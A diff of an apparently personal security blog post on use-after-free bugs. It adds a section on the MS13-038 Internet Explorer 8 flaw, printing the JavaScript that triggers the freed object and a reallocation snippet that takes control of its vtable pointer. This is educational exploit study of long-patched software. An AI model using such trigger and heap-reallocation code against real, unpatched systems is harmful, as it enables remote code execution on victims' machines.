@@ -132,16 +132,59 @@ When we run this code we once again allocate to the memory that was freed, we ca
 
 <img width="721" alt="Screenshot 2025-01-16 at 11 49 10" src="https://github.com/user-attachments/assets/1a9ae2a0-b666-442f-a4f7-a2ec4668cf45" style="border: 1px solid black;" />
 
-Explain randomised allocations
-
-Brute force
-
-Code
-
-Test
+Let's take a look at a real world example.
 
 ## A Real-world Example in IE8
 
-MS013...
+On 14/05/2013 Microsoft issued a security bulletin for [MS13-038](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2013/ms13-038). The ‘vulnerability could allow remote code execution if a user views a specially crafted webpage using Internet Explorer’. Yes, this is a very old bug, but it demonstrates UaF without any complex mitigations that Microsoft have implemented since.
+
+Here is the `html` code that triggered the UaF (this was taken directly from the [Off by One Security Browser Exploitation Introduction live stream](https://www.youtube.com/watch?v=bcnV1dbfKcE) by Stephen Sims):
+
+```javascript
+<script>
+// the bug trigger code
+f0 = document.createElement('span');
+document.body.appendChild(f0);
+f1 = document.createElement('span');
+document.body.appendChild(f1);
+f2 = document.createElement('span');
+document.body.appendChild(f2);
+document.body.contentEditable = "true";
+f2.appendChild(document.createElement('datalist'));
+f1.appendChild(document.createElement('span'));
+f1.appendChild(document.createElement('table'));
+try {
+  f0.offsetParent = null;
+} catch (e) { 
+  f2.innerHTML = "";
+  f0.appendChild(document.createElement('hr'));
+  f1.innerHTML = "";
+  CollectGarbage();
+</script>
+```
+
+To understand it more I recommend watching the video. Anyway, it turns out that this bug frees an allocation of `0x38` bytes and the freed memory once contained a `vptr` to a `vftable`. The browser crashes when it tries to dereference the `vptr`. If we can reallocate that pointer we can point it to anywhere in memory and get code execution by creating a fake `vftable`.
+
+We now know that Windows 7 has a very predictable LFH memory allocation method, so we can use the following code to reallocate in the exact same memory that was freed:
+
+```javascript
+// reallocate
+var vptr = "\u1337\u1337AAAAAAAAAAAAAAAAAAAAAAAAA";
+var div1 = new Array();
+div1.push(document.createElement('div'));
+div1[0].className = vptr;
+```
+
+When we run the PoC when attached to WinDbg we can see that the pointer has been dereferenced and the browser is now trying to dereference a function in a `vftable` that does not exist. The important part to note is that because the heap allocation is predictable we can control that dereferenced address:
+
+<img width="1445" alt="Screenshot 2025-01-16 at 12 23 25" src="https://github.com/user-attachments/assets/fc1a08a0-0a6b-4151-9e6a-c20bc4882168" style="border: 1px solid black;" />
+
+If the UaF existed in an application running on Windows 8 and above this type of reallocation would fail and some sort of brute-forcing or 'grooming' would be required.
+
+## Final Thoughts
+
+I find it always helps when studying things to solidify my understanding by testing the basics. Hopfully this has been helpful to at least one other person on planet earth.
+
+That's all folks!
 
 [Home](https://plackyhacker.github.io)
